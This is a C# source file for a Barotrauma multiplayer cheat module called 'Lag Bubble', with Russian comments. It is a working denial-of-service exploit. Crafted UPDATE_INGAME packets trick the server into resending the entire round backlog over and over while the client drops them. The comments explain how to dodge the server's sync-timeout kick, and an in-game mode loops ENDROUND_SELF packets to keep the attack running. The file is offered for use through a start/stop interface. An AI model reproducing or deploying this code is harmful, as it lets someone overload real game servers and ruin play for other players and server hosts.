using System;
using System.Collections.Generic;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  LAG BUBBLE (волны 458 + 541) — «все лагают, я нет».
    //
    //  Идея: мы НЕ входим в игру (InGame=false, сидим в лобби/спекте),
    //  но серверу через UPDATE_INGAME говорит, что нам нужен ресинк.
    //  Сервер ставит NeedsMidRoundSync=true и начинает ПОСТОЯННО
    //  пересылать ВЕСЬ уникальный бэклог раунда только нам,
    //  троттлингом minInterval (≤0.5с). Мы эти пакеты просто МОЛЧА
    //  дропаем (сервер считает нас «ещё не досинхронились») —
    //  сервер горит CPU/трафиком, а наш клиент почти не тратится:
    //  мы в лобби, у нас нет персонажа, ни симуляции, ни обработки
    //  событий; «все лагают, я нет».
    //
    //  ТРИГГЕР ресинка БЕЗ входа в игру:
    //  • ClientReadIngame (GameServer:1325) читает bool
    //    midroundSyncingDone; если !c.InGame и флаг=false →
    //    InitClientMidRoundSync. НИКАКОЙ перм-гейт, только GameStarted.
    //  • Пакет: UPDATE_INGAME + bool false + pad. 2 байта.
    //  • Повторяем каждые N сек: UnreceivedEntityEventCount держится
    //    на уровне «весь бэклог» — серевер непрерывно льёт историю.
    //
    //  АНТИ-КИК: SyncTimeout (мин 30с) кикает при NeedsMidRoundSync и
    //  InGame. Пока мы НЕ InGame — c.InGame фильтр защищает от кика
    //  (timedOutClients.FindAll требует c.InGame!). Проверено:
    //  ServerEntityEventManager:280 → FindAll(... c.InGame ...).
    //  То есть в лобби-режиме кик по SyncTimeout НЕ ПРИХОДИТ.
    //
    //  Эффект на других: lastSentToAll оттягивается нашим
    //    LastRecvEntityEventID=0 → события дольше висят в памяти
    //    сервера (медленный RAM-рост), плюс сервер постоянно
    //    сериализует бэклог в наш (пустой) приём.
    //  Эффект на нас: лёгкий входящий трафик, ноль игровой нагрузки.
    // ============================================================
    public class LagBubbleModule : CSModuleBase
    {
        public override string Id   => "lag_bubble";
        public override string Name => "Lag Bubble";
        public override string Description =>
            "«Все лагают, я нет». Два режима:\n\n" +
            "• ЛОББИ (безопасно): выйди из раунда, включи — сервер льёт\n" +
            "  тебе весь бэклог вечно, кик по SyncTimeout невозможен\n" +
            "• В РАУНДЕ (кульбит): окно ресинка 30-50с без кика\n" +
            "  (MidRoundSyncTimeOut = max(события/10×интервал, 30с)):\n" +
            "  мод сам успевает ENDROUND_SELF до истечения и открывает\n" +
            "  новое окно — почти непрерывный поток, ты числишься в игре\n" +
            "• Тебе почти ничего не стоит, серверу CPU+трафик+RAM";

        public override string Category => "exploit";

        // ---- настройки пульса ----
        private const float DefaultInterval = 4.0f;   // сек между ресинк-запросами
        private const float MinInterval = 1.0f;
        private const float MaxInterval = 60.0f;

        private static GUIMessageBox _box;
        private static GUITextBlock _status;
        private static float _interval = DefaultInterval;
        private static int _uiSession;
        private static int _sent;
        private static bool _running;
        private static bool _waitingAfterEndRound;

        public override string GetLabel() => _running ? "Lag Bubble [ВКЛ]" : "Lag Bubble 🫧";

        public override void OnClick()
        {
            if (_box != null) { CloseBox(); return; }
            Open();
        }

        private static void CloseBox()
        {
            _box?.Close();
            _box = null;
            _status = null;
            _running = false;
            _uiSession++; // глушим корутину
        }

        private static void Open()
        {
            if (GameMain.Client == null)
            {
                GUI.AddMessage("[LagBubble] Только в мультиплеере", Color.Orange);
                return;
            }
            if (!AmInGame() && string.IsNullOrEmpty(GameMain.Client?.Name))
            {
                GUI.AddMessage("[LagBubble] Нет соединения", Color.Orange);
                return;
            }

            _box = new GUIMessageBox(
                headerText: "LAG BUBBLE",
                text: "",
                buttons: new LocalizedString[] { },
                relativeSize: new Vector2(0.55f, 0.55f));

            var content = _box.Content;
            content.ClearChildren();

            _status = new GUITextBlock(
                new RectTransform(new Vector2(0.97f, 0.16f), content.RectTransform),
                StatusText(),
                textAlignment: Alignment.CenterLeft, wrap: true,
                font: GUIStyle.SmallFont);
            _status.TextColor = new Color(120, 220, 255);

            // интервал
            var intervalRow = new GUILayoutGroup(
                new RectTransform(new Vector2(0.97f, 0.1f), content.RectTransform),
                isHorizontal: true);
            intervalRow.RelativeSpacing = 0.01f;

            new GUITextBlock(
                new RectTransform(new Vector2(0.55f, 1f), intervalRow.RectTransform),
                "Интервал (сек):", textAlignment: Alignment.CenterLeft);

            var intervalBox = new GUITextBox(
                new RectTransform(new Vector2(0.4f, 1f), intervalRow.RectTransform),
                ((int)_interval).ToString());

            // кнопки
            var btns = new GUILayoutGroup(
                new RectTransform(new Vector2(0.97f, 0.68f), content.RectTransform),
                isHorizontal: false);
            btns.RelativeSpacing = 0.01f;

            var startBtn = new GUIButton(
                new RectTransform(new Vector2(1f, 0.3f), btns.RectTransform), "");
            startBtn.Color = new Color(170, 60, 60);
            startBtn.OnClicked = (b, d) =>
            {
                if (_running)
                {
                    _running = false;
                    _uiSession++;
                    startBtn.Text = "СТАРТ ПУЛЬСА";
                    Msg("пульс остановлен", Color.Orange);
                }
                else
                {
                    // InGame тоже ок: in-game кульбит (окно ресинка + ENDROUND-рефреш)
                    if (!float.TryParse((intervalBox.Text ?? "").Trim(), out _interval))
                    { _interval = DefaultInterval; }
                    _interval = Math.Clamp(_interval, MinInterval, MaxInterval);

                    _running = true;
                    _sent = 0;
                    _uiSession++;
                    CoroutineManager.StartCoroutine(PulseLoop(_uiSession));
                    startBtn.Text = "СТОП";
                    Msg("пульс запущен — интервал " + (int)_interval + "с", Color.Lime);
                }
                UpdateStatus();
                return true;
            };
            startBtn.Text = _running ? "СТОП" : "СТАРТ ПУЛЬСА";

            var onceBtn = new GUIButton(
                new RectTransform(new Vector2(1f, 0.3f), btns.RectTransform),
                "ОДИН ресинк-запрос (тест)");
            onceBtn.Color = new Color(60, 120, 80);
            onceBtn.OnClicked = (b, d) =>
            {
                SendResyncRequest();
                _sent++;
                Msg("запрос отправлен (сервер должен начать лить бэклог)", Color.Lime);
                UpdateStatus();
                return true;
            };

            var note = new GUITextBlock(
                new RectTransform(new Vector2(1f, 0.3f), btns.RectTransform),
                "Условия: ты в ЛОББИ (не InGame), раунд запущен,\n" +
                "в бэклоге есть уникальные события (раунд не пустой).\n" +
                "Один запрос держит поток навсегда, интервал — страховка.",
                textAlignment: Alignment.CenterLeft, wrap: true,
                font: GUIStyle.SmallFont);
            note.TextColor = new Color(160, 170, 190);

            UpdateStatus();
        }

        // InGame живёт на Client (в списке ConnectedClients), не на GameClient.
        // Себя находим по SessionId — как ваниль (Voting.cs:426).
        private static Client MyClient()
        {
            var c = GameMain.Client;
            if (c == null) { return null; }
            try { return c.ConnectedClients?.Find(cl => cl.SessionId == c.SessionId); }
            catch { return null; }
        }

        private static bool AmInGame()
        {
            var me = MyClient();
            return me != null && me.InGame;
        }

        private static string StatusText()
        {
            var c = GameMain.Client;
            string state = c == null ? "нет клиента" : AmInGame() ? "в раунде (InGame)" : "в лобби";
            return "состояние: " + state + " | запросов: " + _sent;
        }

        private static void UpdateStatus()
        {
            if (_status != null) { _status.Text = StatusText(); }
        }

        private static void Msg(string text, Color color) => GUI.AddMessage("[LagBubble] " + text, color);

        // Пульс: повторяем ресинк-запрос каждые _interval сек, пока включено
        // и мы в лобби. Один запрос технически держит поток сам (сервер льёт,
        // мы не отвечаем «досинхронились»), интервал — страховка от
        // параноидальных серверов с кастом-патчами.
        private static IEnumerable<CoroutineStatus> PulseLoop(int session)
        {
            double next = 0.0;
            // окно ресинка в раунде: max(события/10×интервал, 30с) — рефрешим
            // ENDROUND_SELF-кульбитом сильно раньше истечения
            double inGameWindow = 25.0;
            double lastWindowStart = Timing.TotalTime;

            while (_running && session == _uiSession)
            {
                yield return CoroutineStatus.Running;
                if (Timing.TotalTime < next) { continue; }

                var c = GameMain.Client;
                if (c == null) { yield break; }

                if (_waitingAfterEndRound)
                {
                    _waitingAfterEndRound = false;
                    SendResyncRequest();
                    _sent++;
                    next = Timing.TotalTime + _interval;
                    Msg("окно обновлено (ENDROUND + ресинк) — пакетов: " + _sent, Color.Cyan);
                    UpdateStatus();
                    continue;
                }

                if (!AmInGame())
                {
                    // ЛОББИ-режим: простой ресинк-запрос, кик невозможен
                    next = Timing.TotalTime + _interval;
                    SendResyncRequest();
                    _sent++;
                    UpdateStatus();
                    continue;
                }

                // IN-GAME режим: следим за окном
                if (Timing.TotalTime - lastWindowStart < inGameWindow)
                {
                    next = Timing.TotalTime + 1.0; // проверка окна раз в сек
                    continue;
                }

                // окно на исходе: ENDROUND (InGame=false, кик-фильтры off) →
                // сразу новый ресинк-запрос = новое окно. Пользователь мигнёт
                // в лобби на долю секунды.
                // ENDROUND сам по себе НЕ гарантирует мгновенную обработку сервером
                // (пакет может встать в очередь) — посылаем ENDROUND, на след.
                // итерации корутины (след. кадр) шлём ресинк-запрос.
                SendEndRoundSelf();
                _sent++;
                _waitingAfterEndRound = true;
                lastWindowStart = Timing.TotalTime;
                next = Timing.TotalTime + 0.5; // пол-секунды на обработку
                UpdateStatus();
            }
        }

        private static void SendEndRoundSelf()
        {
            var peer = GameMain.Client?.ClientPeer;
            if (peer == null) { return; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.ENDROUND_SELF);
            peer.Send(msg, DeliveryMethod.Unreliable);
        }

        // ---- пакеты ----

        private static void SendResyncRequest()
        {
            var peer = GameMain.Client?.ClientPeer;
            if (peer == null) { return; }

            // UPDATE_INGAME: bool midroundSyncingDone=false + pad
            // GameServer:1341: !c.InGame && !midroundSyncingDone →
            // InitClientMidRoundSync → весь uniqueEvents-бэклог в очередь нам.
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(false);
            msg.WritePadBits();
            peer.Send(msg, DeliveryMethod.Unreliable);
        }

        public override void Update() { }

        public override void Dispose()
        {
            _running = false;
            _uiSession++;
            base.Dispose();
        }
    }
}
